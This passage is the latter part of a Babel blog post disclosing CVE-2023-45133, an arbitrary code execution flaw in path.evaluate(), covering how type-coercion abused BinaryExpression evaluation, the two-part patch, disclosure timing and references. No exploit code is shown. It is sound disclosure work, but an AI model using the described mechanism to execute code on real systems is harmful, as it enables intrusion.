fill=currentColor d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/></svg><svg viewBox="0 0 24 24" class=copyButtonSuccessIcon_LjdS><path fill=currentColor d=M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z /></svg></span></button></div></div></div>
<p>The first example employs type-coercion to transform the object into a string. In contrast, the second example utilizes type-coercion to convert it into a number, as detailed in <a href=https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/valueOf target=_blank rel="noopener noreferrer">Object.prototype.valueOf()</a>. Both examples exploit the <code>_evaluate()</code> method’s approach to handling <code>BinaryExpression</code> nodes, which directly performs the operation after recursively evaluating the left and right operands.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id=the-patch>The Patch<a href=#the-patch class=hash-link aria-label="Direct link to The Patch" title="Direct link to The Patch">​</a></h2>
<p>Upon disclosing this vulnerability, I was impressed by the swift response from the Babel team, who promptly rolled out a patch. This patch was released in two parts:</p>
<p>The first of which was a workaround for all of the affected official Babel packages, by guarding the calls to <code>evalute()</code> with an <code>isPure()</code> check. <a href=https://github.com/babel/babel/blob/4c155667cf50291132089a4556cd3c6cc9d2e640/packages/babel-traverse/src/scope/index.ts#L871 target=_blank rel="noopener noreferrer">isPure</a> inherently prevents this bug, as it returns false for all <code>MemberExpression</code> nodes. <a href=https://github.com/babel/babel/pull/16032 target=_blank rel="noopener noreferrer">PR #16032: Update babel-polyfills packages</a></p>
<p>The subsequent step involved refining the <code>evaluate()</code> function. This adjustment ensured that all inherited methods, not only <code>constructor</code>, were prevented from being called. <a href=https://github.com/babel/babel/pull/16033 target=_blank rel="noopener noreferrer">PR #16033: Only evaluate own String/Number/Math methods</a></p>
<p>After the fixes were implemented, GitHub staff issued <a href=https://github.com/advisories/GHSA-67hx-6x53-jw92 target=_blank rel="noopener noreferrer"><strong>CVE-2023-45133</strong></a> for the security advisory.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id=a-side-note-on-disclosure-timing>A side note on disclosure timing<a href=#a-side-note-on-disclosure-timing class=hash-link aria-label="Direct link to A side note on disclosure timing" title="Direct link to A side note on disclosure timing">​</a></h2>
<p>You might have noticed that this blog post was released on the same day as the security advisory. Usually for critical vulnerabilities, it’s customary to wait a while before disclosing a proof of concept. However, I believe this disclosure timing is justifiable for a few reasons:</p>
<p>Predominantly, the vast majority of Babel users remain unaffected by this vulnerability. Babel is primarily utilized for refactoring and transpiling <strong>one’s own code</strong>, which means the typical use case doesn’t expose users to this risk. It’s improbable that many have server-side implementations that accept and process arbitrary code from users through the compilation plugins or the invocation of <code>path.evaluate</code>. Furthermore, there are really only a couple real use-cases for using Babel to analyze untrusted code on the server-side:</p>
<ol>
<li>Reverse engineering bot mitigation software, etc.</li>
<li>Malware analysis</li>
</ol>
<p>In the first case, I doubt any legitimate bot mitigation entity would try to attempt Remote Code Execution (RCE) due to the legal ramifications. Meanwhile, professionals using Babel for malware reversal possess the expertise to conduct their analyses within controlled, sandboxed environments. Thus, the risk to the community, in real-world scenarios, remains minimal.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id=conclusion>Conclusion<a href=#conclusion class=hash-link aria-label="Direct link to Conclusion" title="Direct link to Conclusion">​</a></h2>
<p>Discovering and delving into this vulnerability was a fun experience. I initially stumbled upon the vulnerability during a brainstorming session for a Babel-based challenge for UofTCTF’s upcoming capture the flag competition, where I was focusing on an entirely different, non-security-related “bug”.</p>
<p>This vulnerability predominantly impacts those integrating untrusted code with Babel. Unfortunately, this places individuals leveraging Babel for “static deobfuscation” directly in the crosshairs of this attack vector.</p>
<p>There’s a touch of irony in the fact that my first credited CVE emerged from reverse engineering Babel - the very tool I often employ for reverse engineering JavaScript, and the topic of all of my previous posts 🤣.</p>
<p>This was a great learning experience, and hopefully this write-up was useful to you as well. Thanks for reading, and take care!</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id=references>References<a href=#references class=hash-link aria-label="Direct link to References" title="Direct link to References">​</a></h2>
<ul>
<li><a href="https://www.cve.org/CVERecord?id=CVE-2023-45133" target=_blank rel="noopener noreferrer">CVE-2023-45133</a></li>
<li><a href=https://github.com/advisories/GHSA-67hx-6x53-jw92 target=_blank rel="noopener noreferrer">GitHub Advisory Database: Arbitrary code execution when compiling specifically crafted malicious code</a></li>
</ul></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Blog post page navigation"><a class="pagination-nav__link pagination-nav__link--prev" href=/blog/2024/02/28/7.24.0><div class=pagination-nav__sublabel>Newer post</div><div class=pagination-nav__label>7.24.0 Released: Decorator updates and JSON modules imports</div></a><a class="pagination-nav__link pagination-nav__link--next" href=/blog/2023/09/25/7.23.0><div class=pagination-nav__sublabel>Older post</div><div class=pagination-nav__label>7.23.0 Released: Decorator Metadata and many new `import` features!</div></a></nav></main><div class="col col--2"><div class="tableOfContents_bqdL thin-scrollbar"><ul class="table-of-contents table-of-contents__left-border"><li><a href=#the-exploit class="table-of-contents__link toc-highlight">The Exploit</a><ul><li><a href=#proof-of-concept class="table-of-contents__link toc-highlight">Proof of Concept</a><li><a href=#exploit-breakdown class="table-of-contents__link toc-highlight">Exploit Breakdown</a></ul><li><a href=#the-patch class="table-of-contents__link toc-highlight">The Patch</a><li><a href=#a-side-note-on-disclosure-timing class="table-of-contents__link toc-highlight">A side note on disclosure timing</a><li><a href=#conclusion class="table-of-contents__link toc-highlight">Conclusion</a><li><a href=#references class="table-of-contents__link toc-highlight">References</a></ul></div></div></div></div></div><footer class=nav-footer id=footer><section class=sitemap><a class=nav-home href=/><img src=https://d33wubrfki0l68.cloudfront.net/7a197cfe44548cc1a3f581152af70a3051e11671/78df8/img/babel.svg alt=Babel width=66 height=58></a><div><h5>Docs</h5><a href=/docs/learn>Learn ES2015</a></div><div><h5>Community</h5><a href=/videos>Videos</a><a href=/users>User Showcase</a><a href=http://stackoverflow.com/questions/tagged/babeljs target=_blank rel="noopener noreferrer">Stack Overflow</a><a href=https://babeljs.slack.com/ target=_blank rel="noopener noreferrer">Slack Channel</a><a href=https://x.com/babeljs target=_blank rel="noopener noreferrer">X (Twitter)</a><a href=https://bsky.app/profile/babel.dev target=_blank rel="noopener noreferrer">Bluesky</a></div><div><h5>More</h5><a href=/blog>Blog</a><a href=https://github.com/babel target=_blank rel="noopener noreferrer">GitHub Org</a><a href=https://github.com/babel/babel target=_blank rel="noopener noreferrer">GitHub Repo</a><a href=https://github.com/babel/website target=_blank rel="noopener noreferrer">Website Repo</a><a href=https://old.babeljs.io target=_blank rel="noopener noreferrer">Old 6.x Site</a><a href=http://henryzoo.com/babel.github.io target=_blank rel="noopener noreferrer">Old 5.x Site</a></div></section></footer></div>